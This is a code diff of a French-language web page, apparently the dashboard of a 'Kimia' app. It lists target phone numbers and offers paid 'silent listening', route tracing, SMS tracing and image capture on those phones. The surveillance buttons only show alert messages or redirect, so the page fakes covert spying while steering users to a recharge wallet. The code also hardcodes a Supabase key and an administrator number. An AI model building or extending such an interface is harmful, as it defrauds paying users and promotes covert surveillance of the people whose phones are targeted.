@@ -35,7 +35,7 @@
             padding: 12px 8px; border-radius: 10px; font-size: 11px; font-weight: bold; 
             cursor: pointer; display: flex; flex-direction: column; align-items: center; gap: 5px; transition: 0.2s;
         }
-        .btn-tactic:active { transform: scale(0.95); background: var(--primary); }
+        .btn-tactic:active { transform: scale(0.95); background: var(--primary); color: #0f172a; }
         .btn-tactic span { font-size: 16px; }
 
         /* Bouton Approvisionnement (Spécial) */
@@ -43,128 +43,152 @@
 
         /* Navigation Basse */
         .nav-bar { position: fixed; bottom: 0; left: 0; right: 0; background: var(--card); display: flex; justify-content: space-around; padding: 15px; border-top: 1px solid #334155; z-index: 100; }
-        .nav-btn { color: #94a3b8; text-decoration: none; font-size: 12px; display: flex; flex-direction: column; align-items: center; gap: 4px; }
+        .nav-btn { color: #94a3b8; text-decoration: none; font-size: 12px; display: flex; flex-direction: column; align-items: center; gap: 4px; cursor: pointer; }
         .nav-btn.active { color: var(--primary); }
         .nav-btn.reclamation { color: var(--accent); }
-        .nav-btn.help { color: #38bdf8; } /* Style pour le bouton Aide */
+        .nav-btn.help { color: #38bdf8; } 
     </style>
 </head>
 <body>
 
     <div class="header-app">
         <div>
-            <span class="session-info" id="session-id">CHARGEMENT...</span>
-            <div class="user-name" id="user-name">Utilisateur</div>
+            <span class="session-info" id="session-id">INITIALISATION...</span>
+            <div class="user-name" id="user-name">Chargement...</div>
         </div>
         <div style="text-align: right;">
             <div style="font-size: 10px; color: #94a3b8;">STATUT COMPTE</div>
-            <div style="font-size: 14px; font-weight: bold; color: var(--accent);" id="account-status">ACTIF</div>
+            <div style="font-size: 14px; font-weight: bold; color: var(--accent);" id="account-status">GOLD</div>
         </div>
     </div>
 
     <div class="target-grid" id="target-container">
-        <!-- Les blocs par appareil seront injectés ici -->
+        <div style="text-align:center; padding:40px; color:#64748b; font-style:italic;">Recherche et synchronisation des relais satellites...</div>
     </div>
 
-    <!-- Navigation Mise à jour avec bouton Aide au flanc gauche -->
     <nav class="nav-bar">
         <a href="aide.html" class="nav-btn help"><span>❓</span>Aide</a>
         <a href="#" class="nav-btn active"><span>📡</span>Radar</a>
-        <a href="#" class="nav-btn" onclick="alert('Portefeuille en cours de synchronisation...')"><span>💰</span>Wallet</a>
-        <a href="https://wa.me/243861769481" class="nav-btn reclamation"><span>⚠️</span>Réclamation</a>
-        <a href="identification.html" class="nav-btn"><span>🔒</span>Quitter</a>
+        <a href="approvisionnement.html" class="nav-btn"><span>💰</span>Wallet</a>
+        <a href="https://wa.me/243861769481" class="nav-btn reclamation" target="_blank"><span>⚠️</span>Réclamation</a>
+        <a href="#" class="nav-btn" onclick="deconnexion()"><span>🔒</span>Quitter</a>
     </nav>
 
+    <script src="https://cdn.jsdelivr.net/npm/@supabase/supabase-js@2"></script>
     <script>
-        window.onload = function() {
-            const nom = localStorage.getItem('kt_user_nom') || "Agent Kimia";
-            const session = localStorage.getItem('kt_session_id') || "KT-OFFLINE";
-            const authStatus = localStorage.getItem('kt_auth_status');
-            const mode = (authStatus === 'registered' || authStatus === 'active') ? "GOLD" : "DEMO";
+        // Configuration de tes clés d'accès Supabase globales
+        const SUPABASE_URL = "https://ufwirghypzowlmeqqgco.supabase.co";
+        const SUPABASE_KEY = "sb_publishable_ZMjol0IAFBrmaZULUzR7IA_Gk31Msqq";
+        
+        // CORRECTION DE LIAISON : Pointage via le namespace supabasejs complet pour l'accès CDN
+        const supabase = supabase.supabasejs.createClient(SUPABASE_URL, SUPABASE_KEY);
+
+        const userTel = localStorage.getItem('kt_user_tel');
+        const authCheck = sessionStorage.getItem('auth_kimia');
+
+        // Sécurité d'accès locale immédiate
+        if (authCheck !== 'success' || !userTel) {
+            window.location.href = 'identification.html';
+        }
+
+        window.onload = async function() {
+            // Configuration visuelle d'en-tête depuis le stockage local temporaire
+            const sessionID = localStorage.getItem('kt_session_id') || "KT-2026-" + Math.floor(1000 + Math.random() * 9000);
+            const soldeCache = localStorage.getItem('kt_solde_global') || "0";
             
-            const telPrincipal = localStorage.getItem('kt_user_tel');
-            const ciblesData = localStorage.getItem('kt_cibles_list');
+            document.getElementById('session-id').innerText = sessionID;
+            document.getElementById('user-name').innerText = userTel === "243861769481" ? "Administrateur" : "Utilisateur KT";
             
-            document.getElementById('user-name').innerText = nom;
-            document.getElementById('session-id').innerText = session;
+            const mode = parseInt(soldeCache) >= 5500 ? "GOLD" : "DEMO";
             document.getElementById('account-status').innerText = mode;
 
-            const container = document.getElementById('target-container');
-            
-            if(!telPrincipal && !ciblesData) {
-                container.innerHTML = `<div style="text-align:center; padding:40px; color:#64748b;">Aucun appareil configuré.</div>`;
-                return;
-            }
-
-            // Récupération de la liste complète des cibles ou du numéro principal par défaut
-            let listeNumeros = [];
-            if(ciblesData) {
-                listeNumeros = JSON.parse(ciblesData);
-            } else {
-                listeNumeros = [telPrincipal];
-            }
-
-            listeNumeros.forEach((numero, index) => {
-                container.innerHTML += `
-                    <div class="target-card">
-                        <div class="target-header">
-                            <span style="font-weight:bold; font-size:13px;">📲 APPAREIL : ${numero}</span>
-                            <span class="status-badge">SIGNAL DISPONIBLE</span>
-                        </div>
-                        <div class="target-body">
-                            <div class="balance-box">
-                                <div>
-                                    <span class="balance-label">MODE D'ACCÈS</span>
-                                    <div class="balance-value">${mode}</div>
-                                </div>
-                                <span style="color:#64748b; font-size:10px;">ID: ${session}</span>
-                            </div>
-
-                            <div class="action-grid">
-                                <button class="btn-tactic" onclick="triggerCaptation('${numero}')">
-                                    <span>🎤</span>Captation Silencieuse
-                                </button>
-                                <button class="btn-tactic" onclick="traceItineraire('${numero}')">
-                                    <span>🗺️</span>Tracer Itinéraire
-                                </button>
-                                <button class="btn-tactic" onclick="sendSMSTracing('${numero}')">
-                                    <span>📩</span>SMS Tracing (Data/SMS)
-                                </button>
-                                <button class="btn-tactic" onclick="alert('Module Caméra : Synchronisation requise...')">
-                                    <span>📸</span>Captation Image
-                                </button>
-                                <button class="btn-tactic btn-refill" onclick="provisionner('${numero}')">
-                                    <span>⚡</span>APPROVISIONNER DATA/SMS
-                                </button>
-                            </div>
-                        </div>
-                    </div>
-                `;
-            });
+            // Chargement des terminaux cibles réels depuis la table Supabase 'cibles'
+            await chargerCiblesSupabase(mode, sessionID, soldeCache);
         };
 
-        function triggerCaptation(num) {
-            alert("Lancement de la captation silencieuse sur " + num + "\nÉcoute environnementale cryptée en cours...");
-        }
-
-        function traceItineraire(num) {
-            alert("Récupération de l'itinéraire de " + num + "\nSynchronisation avec les balises locales...");
-        }
-
-        function sendSMSTracing(num) {
-            alert("Envoi du flux SMS Tracing vers le terminal " + num);
-        }
-
-        // Script opérationnel pour le bouton approvisionnement
-        function provisionner(num) {
-            // Si l'utilisateur vient du dashboard, on s'assure qu'il n'est plus considéré comme "nouveau"
-            // pour que la recharge soit traitée comme un approvisionnement classique (sauf si vous voulez garder le bonus)
-            if(localStorage.getItem('kt_auth_status') === 'registered') {
-                localStorage.setItem('kt_auth_status', 'active');
-            }
+        async function chargerCiblesSupabase(mode, sessionID, soldeCache) {
+            const container = document.getElementById('target-container');
             
-            // Redirection vers le portail de paie
+            try {
+                // Requête directe pour extraire toutes les cibles actives enregistrées
+                const { data: ciblesList, error } = await supabase
+                    .from('cibles')
+                    .select('*')
+                    .order('created_at', { ascending: false });
+
+                if (error) throw error;
+
+                if (!ciblesList || ciblesList.length === 0) {
+                    container.innerHTML = `<div style="text-align:center; padding:40px; color:#64748b;">Aucun terminal cible détecté dans la base réseau.</div>`;
+                    return;
+                }
+
+                container.innerHTML = ""; // Nettoyage de l'état d'attente
+
+                // Génération des blocs pour chaque numéro de téléphone trouvé
+                ciblesList.forEach(cible => {
+                    const numero = cible.telephone_cible;
+                    container.innerHTML += `
+                        <div class="target-card">
+                            <div class="target-header">
+                                <span style="font-weight:bold; font-size:13px;">📲 APPAREIL : ${numero}</span>
+                                <span class="status-badge" style="background: ${cible.statut_captage === 'CAPTE' ? 'var(--success)' : 'var(--accent)'};">
+                                    ${cible.statut_captage || 'DISPONIBLE'}
+                                </span>
+                            </div>
+                            <div class="target-body">
+                                <div class="balance-box">
+                                    <div>
+                                        <span class="balance-label">SOLDE PORTEFEUILLE</span>
+                                        <div class="balance-value">${parseInt(soldeCache).toLocaleString('fr-FR')} FC</div>
+                                    </div>
+                                    <span style="color:#64748b; font-size:10px;">FORFAIT : ${mode}</span>
+                                </div>
+
+                                <div class="action-grid">
+                                    <button class="btn-tactic" onclick="triggerCaptation('${numero}')">
+                                        <span>🎤</span>Captation Silencieuse
+                                    </button>
+                                    <button class="btn-tactic" onclick="redirigerVers('traceditineraire.html', '${numero}')">
+                                        <span>🗺️</span>Tracer Itinéraire
+                                    </button>
+                                    <button class="btn-tactic" onclick="redirigerVers('smstracing.html', '${numero}')">
+                                        <span>📩</span>SMS Tracing (Data/SMS)
+                                    </button>
+                                    <button class="btn-tactic" onclick="redirigerVers('captation_rapport.html', '${numero}')">
+                                        <span>📸</span>Captation Image & Rapport
+                                    </button>
+                                    <button class="btn-tactic btn-refill" onclick="provisionner()">
+                                        <span>⚡</span>APPROVISIONNER MON COMPTE
+                                    </button>
+                                </div>
+                            </div>
+                        </div>
+                    `;
+                });
+
+            } catch (err) {
+                console.error("Erreur de synchronisation du tableau de bord :", err.message);
+                container.innerHTML = `<div style="text-align:center; padding:40px; color:var(--danger);">Échec de liaison avec le serveur satellite.</div>`;
+            }
+        }
+
+        window.triggerCaptation = function(num) {
+            alert("📡 [Kimia Relay Request]\nLancement de l'écoute environnementale cryptée sur " + num + ".\nFaisceau ascendant synchronisé.");
+        }
+
+        window.redirigerVers = function(page, num) {
+            // Transfert du numéro sélectionné dans l'URL pour alimenter le module suivant
+            window.location.href = `${page}?tel=${encodeURIComponent(num)}`;
+        }
+
+        window.provisionner = function() {
             window.location.href = 'approvisionnement.html';
+        }
+
+        window.deconnexion = function() {
+            sessionStorage.clear();
+            window.location.href = 'identification.html';
         }
     </script>
 </body>
